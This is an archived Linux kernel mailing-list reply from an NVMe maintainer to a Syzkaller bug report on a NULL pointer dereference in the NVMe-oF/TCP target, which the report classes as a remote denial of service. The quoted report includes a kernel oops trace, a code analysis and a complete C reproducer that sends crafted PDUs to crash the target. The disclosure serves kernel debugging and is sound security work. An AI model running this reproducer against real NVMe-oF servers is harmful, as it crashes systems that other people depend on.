Return-Path: <linux-nvme-bounces+linux-nvme=archiver.kernel.org@lists.infradead.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from bombadil.infradead.org (bombadil.infradead.org [198.137.202.133])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 050FFC197A0
	for <linux-nvme@archiver.kernel.org>; Mon, 20 Nov 2023 10:37:08 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.infradead.org; s=bombadil.20210309; h=Sender:List-Subscribe:List-Help
	:List-Post:List-Archive:List-Unsubscribe:List-Id:Content-Transfer-Encoding:
	Content-Type:In-Reply-To:From:References:Cc:To:Subject:MIME-Version:Date:
	Message-ID:Reply-To:Content-ID:Content-Description:Resent-Date:Resent-From:
	Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:List-Owner;
	bh=V+M9de5KJMzXCvtSoMxUVde/JcUc1KuXhusDfVa+lCw=; b=ngrjExOnIv9m+95QwHCv4T+ekK
	BTlASKQob6fZ0W1v7wZNVToDue99aGD2LY/XoLrGEG6/E24vdM1FlXz9VHqUDaqcbq7gAps1vtepp
	nX1k4JAWUekoC/sUNhqBb+yA2P1/+CEg6cdubSabGc2qsE/VAGZ0a1YsrZEJjP5SNKbKPS3EzMCyP
	4oGFQTvMbtBeuiAlRtYJ1vx6DtLCxg1MNI3TZdI11XwfuU7M6VG4+ZZeyJqGtG+a2HKzzmc4ZEnhR
	+RCatJm/lQD/AwEYA2zlwmC8GR00LPbiiSVsdgUBCfoqAq/an0DgpACEwQE++FEAP5xkGCZix8Cv0
	RLn5GcNA==;
Received: from localhost ([::1] helo=bombadil.infradead.org)
	by bombadil.infradead.org with esmtp (Exim 4.96 #2 (Red Hat Linux))
	id 1r51eI-00BnNL-10;
	Mon, 20 Nov 2023 10:37:02 +0000
Received: from mail-ej1-f43.google.com ([209.85.218.43])
	by bombadil.infradead.org with esmtps (Exim 4.96 #2 (Red Hat Linux))
	id 1r51eD-00BnMp-0v
	for linux-nvme@lists.infradead.org;
	Mon, 20 Nov 2023 10:37:00 +0000
Received: by mail-ej1-f43.google.com with SMTP id a640c23a62f3a-9e3eaf098f1so125614966b.0
        for <linux-nvme@lists.infradead.org>; Mon, 20 Nov 2023 02:36:55 -0800 (PST)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1700476615; x=1701081415;
        h=content-transfer-encoding:in-reply-to:from:references:cc:to
         :content-language:subject:user-agent:mime-version:date:message-id
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=V+M9de5KJMzXCvtSoMxUVde/JcUc1KuXhusDfVa+lCw=;
        b=sTRj8gptQ1WAa2DuGvr7Sy8hM8nulA/WeP6Ns9IlW9ua6Z1fWDQlVS+Lx790sA0fOp
         qw89iVfsK1a4BVh01DDdm+nHiZ7Js+1rnyUFRUthncvYVVlp5DTjND6JlCpGijWJSXdP
         XMmzDfCcHP2EtMQpsY9rQIofpBqTC3FhIl317LfXSiGmuI7Kfv6oxI167c/iZFcbqEmM
         h/zYoZ63yF81NWld3cpJTj06+CUUlWn4pPTXURqwchRpFBsMChChmx+o6ZH7rHaiNpG6
         IlyxJTfulspqx/OatUeJnozg+pw4Yt6gVVCSkZ4jsymMINHVrMb6PIXP2YiMLrHPNDOt
         +S8Q==
X-Gm-Message-State: AOJu0YyTQHQ1cjdu0xRmKyyWHTFVfIV8mxgL/H1ykYi2KzkVyoAAM3F+
	9i/Edz6ihBzjsXI6bVDYINM=
X-Google-Smtp-Source: AGHT+IE5lxtb4g1reKdo38jnvf2fovkPofS809eZyUBzTxMEboIOq7XU9JgZfFvuVNSWcCmuho86ZA==
X-Received: by 2002:a17:906:20d9:b0:9dd:d8cf:848d with SMTP id c25-20020a17090620d900b009ddd8cf848dmr4575002ejc.1.1700476614389;
        Mon, 20 Nov 2023 02:36:54 -0800 (PST)
Received: from [192.168.64.177] (bzq-219-42-90.isdn.bezeqint.net. [62.219.42.90])
        by smtp.gmail.com with ESMTPSA id lh25-20020a170906f8d900b009fd50aa6984sm1367469ejb.83.2023.11.20.02.36.53
        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
        Mon, 20 Nov 2023 02:36:54 -0800 (PST)
Message-ID: <89a927a6-2baf-434a-b1d5-50fb99beca73@grimberg.me>
Date: Mon, 20 Nov 2023 12:36:52 +0200
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [Bug Report] NVMe-oF/TCP - NULL Pointer Dereference in
 `nvmet_tcp_execute_request`
Content-Language: en-US
To: Alon Zahavi <zahavi.alon@gmail.com>, linux-nvme@lists.infradead.org
Cc: Christoph Hellwig <hch@lst.de>, Chaitanya Kulkarni <chaitanyak@nvidia.com>
References: <CAK5usQtOYQoHdOnfYi24kDx+qmA98hDnV7XuH1N2oKd+PyPsBQ@mail.gmail.com>
From: Sagi Grimberg <sagi@grimberg.me>
In-Reply-To: <CAK5usQtOYQoHdOnfYi24kDx+qmA98hDnV7XuH1N2oKd+PyPsBQ@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
X-CRM114-Version: 20100106-BlameMichelson ( TRE 0.8.0 (BSD) ) MR-646709E3 
X-CRM114-CacheID: sfid-20231120_023657_440928_4A018F02 
X-CRM114-Status: GOOD (  23.65  )
X-BeenThere: linux-nvme@lists.infradead.org
X-Mailman-Version: 2.1.34
Precedence: list
List-Id: <linux-nvme.lists.infradead.org>
List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-nvme>,
 <mailto:linux-nvme-request@lists.infradead.org?subject=unsubscribe>
List-Archive: <http://lists.infradead.org/pipermail/linux-nvme/>
List-Post: <mailto:linux-nvme@lists.infradead.org>
List-Help: <mailto:linux-nvme-request@lists.infradead.org?subject=help>
List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-nvme>,
 <mailto:linux-nvme-request@lists.infradead.org?subject=subscribe>
Sender: "Linux-nvme" <linux-nvme-bounces@lists.infradead.org>
Errors-To: linux-nvme-bounces+linux-nvme=archiver.kernel.org@lists.infradead.org


> # Bug Overview
> 
> ## The Bug
> There is a null-ptr-deref in `nvmet_tcp_execute_request`.
> 
> ## Bug Location
> `drivers/nvme/target/tcp.c` in the function `nvmet_tcp_execute_request`.
> 
> ## Bug Class
> Remote Denial of Service
> 
> ## Disclaimer:
> This bug was found using Syzkaller with NVMe-oF/TCP added support.

Hey Alon, thanks for the report.

> 
> # Technical Details
> 
> ## Kernel Report - NULL Pointer Dereference
> ```
> BUG: kernel NULL pointer dereference, address: 0000000000000000
> #PF: supervisor instruction fetch in kernel mode
> #PF: error_code(0x0010) - not-present page
> PGD 800000003c2bc067 P4D 800000003c2bc067 PUD 3dfc5067 PMD 0
> Oops: 0010 [#1] PREEMPT SMP KASAN PTI
> CPU: 0 PID: 2363 Comm: kworker/0:1H Not tainted 6.5.0-rc1+ #4
> Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
> Workqueue: nvmet_tcp_wq nvmet_tcp_io_work
> RIP: 0010:0x0
> Code: Unable to access opcode bytes at 0xffffffffffffffd6.
> RSP: 0018:ffff888013b0fba8 EFLAGS: 00010246
> RAX: 0000000000000000 RBX: 0000000000000000 RCX: 0000000000000000
> RDX: ffff888013d50000 RSI: ffffffff833ddfe5 RDI: ffff88800e5a33e8
> RBP: ffff888013b0fcf0 R08: 0000000000000001 R09: 0000000000000000
> R10: 0000000000000000 R11: 0000000000000001 R12: ffff88800e5a33e8
> R13: 0000000000000000 R14: ffff88800e5a33e0 R15: dffffc0000000000
> FS:  0000000000000000(0000) GS:ffff88806cc00000(0000) knlGS:0000000000000000
> CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> CR2: ffffffffffffffd6 CR3: 0000000016faa003 CR4: 0000000000370ef0
> Call Trace:
>   <TASK>
>   nvmet_tcp_execute_request drivers/nvme/target/tcp.c:578 [inline]
>   nvmet_tcp_try_recv_data drivers/nvme/target/tcp.c:1232 [inline]
>   nvmet_tcp_try_recv_one drivers/nvme/target/tcp.c:1312 [inline]
>   nvmet_tcp_try_recv drivers/nvme/target/tcp.c:1338 [inline]
>   nvmet_tcp_io_work+0x202a/0x2990 drivers/nvme/target/tcp.c:1388
>   process_one_work+0xb54/0x18b0 kernel/workqueue.c:2597
>   worker_thread+0x663/0x1300 kernel/workqueue.c:2748
>   kthread+0x357/0x460 kernel/kthread.c:389
>   ret_from_fork+0x29/0x50 arch/x86/entry/entry_64.S:308
>   </TASK>
> Modules linked in:
> CR2: 0000000000000000
> ---[ end trace 0000000000000000 ]---
> ```
> 
> ## Description
> 
> ### Tracing The Bug
> In the call for `nvmet_tcp_execute_request` (see code block 1), there
> is a call to `cmd->req.execute()`.
> When executing the reproducer, the function pointer is pointing to
> NULL, thus the BUG: Unable to handle NULL pointer dereference.
> 
> Code Block 1:
> ```
> static void nvmet_tcp_execute_request(struct nvmet_tcp_cmd *cmd)
> {
>      if (unlikely(cmd->flags & NVMET_TCP_F_INIT_FAILED))
>          nvmet_tcp_queue_response(&cmd->req);
>      else
>          cmd->req.execute(&cmd->req);
> }
> ```
> 
> The reason why `cmd->req.execute` is NULL when we get into the
> `nvmet_tcp_execute_request` function lies in the `nvmet_req_init`
> function (drivers/nvme/target/core.c).
> 
> Code Block 2:
> ```
> bool nvmet_req_init(struct nvmet_req *req, struct nvmet_cq *cq,
>                                   struct nvmet_sq *sq, const struct
> nvmet_fabrics_ops *ops)
> {
>      ...
> 
>      if (unlikely(!req->sq->ctrl))
>          /* will return an error for any non-connect command: */
>          status = nvmet_parse_connect_cmd(req);
>      else if (likely(req->sq->qid != 0))
>          status = nvmet_parse_io_cmd(req);
>      else
>          status = nvmet_parse_admin_cmd(req);
> 
>    ...
> }
> ```
> 
> In the `nvmet_parse_admin_cmd` and `nvmet_parse_connect_cmd`
> functions, there are some assignments for `req->execute`.
> For example, here is in code block 3, the assignment in
> `nvmet_parse_connect_command` (drivers/nvme/target/fabrics-cmd.c).
> 
> Code Block 3:
> ```
> u16 nvmet_parse_connect_cmd(struct nvmet_req *req)
> {
>      struct nvme_command *cmd = req->cmd;
> 
>      ...
> 
>      if (cmd->connect.qid == 0)
>          req->execute = nvmet_execute_admin_connect;
>      else
>          req->execute = nvmet_execute_io_connect;
>       return 0;
> }
> ```
> 
> ## Root Cause
> When executing the reproducer the `nvmet_parse_connect_cmd` is not
> being called, but execution is continuing to
> `nvmet_tcp_execute_request` .

Your analysis tells me that sq->ctrl was not properly set to NULL when
a connect command was sent? The place where sq->ctrl is set is when
executing a connect command.

Can you send a log trace from nvmet leading up to the stack trace?
Also, I'm trying to decipher what the reproducer does?
tcp connect + icreq + nvme connect pdus?

> 
> ## Reproducer
> I am adding a reproducer generated by Syzkaller with some
> optimizations and minor changes.
> 
> ```
> // autogenerated by syzkaller (https://github.com/google/syzkaller)
> 
> #define _GNU_SOURCE
> 
> #include <endian.h>
> #include <errno.h>
> #include <fcntl.h>
> #include <sched.h>
> #include <stdarg.h>
> #include <stdbool.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/mount.h>
> #include <sys/prctl.h>
> #include <sys/resource.h>
> #include <sys/stat.h>
> #include <sys/syscall.h>
> #include <sys/time.h>
> #include <sys/types.h>
> #include <sys/wait.h>
> #include <unistd.h>
> 
> #include <linux/capability.h>
> 
> uint64_t r[1] = {0xffffffffffffffff};
> 
> void loop(void)
> {
>    intptr_t res = 0;
>    res = syscall(__NR_socket, /*domain=*/2ul, /*type=*/1ul, /*proto=*/0);
>    if (res != -1)
>      r[0] = res;
>    *(uint16_t*)0x20000100 = 2;
>    *(uint16_t*)0x20000102 = htobe16(0x1144);
>    *(uint32_t*)0x20000104 = htobe32(0x7f000001);
>    syscall(__NR_connect, /*fd=*/r[0], /*addr=*/0x20000100ul, /*addrlen=*/0x10ul);
>    *(uint8_t*)0x200001c0 = 0;
>    *(uint8_t*)0x200001c1 = 0;
>    *(uint8_t*)0x200001c2 = 0x80;
>    *(uint8_t*)0x200001c3 = 0;
>    *(uint32_t*)0x200001c4 = 0x80;
>    *(uint16_t*)0x200001c8 = 0;
>    *(uint8_t*)0x200001ca = 0;
>    *(uint8_t*)0x200001cb = 0;
>    *(uint32_t*)0x200001cc = 0;
>    memcpy((void*)0x200001d0,
>           "\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf"
>           "\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf"
>           "\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35"
>           "\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86"
>           "\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf"
>           "\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf"
>           "\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86",
>           112);
>    syscall(__NR_sendto, /*fd=*/r[0], /*pdu=*/0x200001c0ul, /*len=*/0x80ul,
>            /*f=*/0ul, /*addr=*/0ul, /*addrlen=*/0ul);
>    *(uint8_t*)0x200001c0 = 6;
>    *(uint8_t*)0x200001c1 = 3;
>    *(uint8_t*)0x200001c2 = 0x18;
>    *(uint8_t*)0x200001c3 = 0x18;
>    *(uint32_t*)0x200001c4 = 9;
>    *(uint16_t*)0x200001c8 = 0;
>    *(uint16_t*)0x200001ca = 0;
>    *(uint32_t*)0x200001cc = 0;
>    *(uint32_t*)0x200001d0 = 0;
>    memset((void*)0x200001d4, 0, 4);
>    *(uint64_t*)0x20000240 = 0;
>    syscall(__NR_sendto, /*fd=*/r[0], /*pdu=*/0x200001c0ul, /*len=*/0x88ul,
>            /*f=*/0ul, /*addr=*/0ul, /*addrlen=*/0ul);
> }
> int main(void)
> {
>    syscall(__NR_mmap, /*addr=*/0x1ffff000ul, /*len=*/0x1000ul, /*prot=*/0ul,
>            /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
>    syscall(__NR_mmap, /*addr=*/0x20000000ul, /*len=*/0x1000000ul, /*prot=*/7ul,
>            /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
>    syscall(__NR_mmap, /*addr=*/0x21000000ul, /*len=*/0x1000ul, /*prot=*/0ul,
>            /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
>    loop();
>    return 0;
> }
> ```

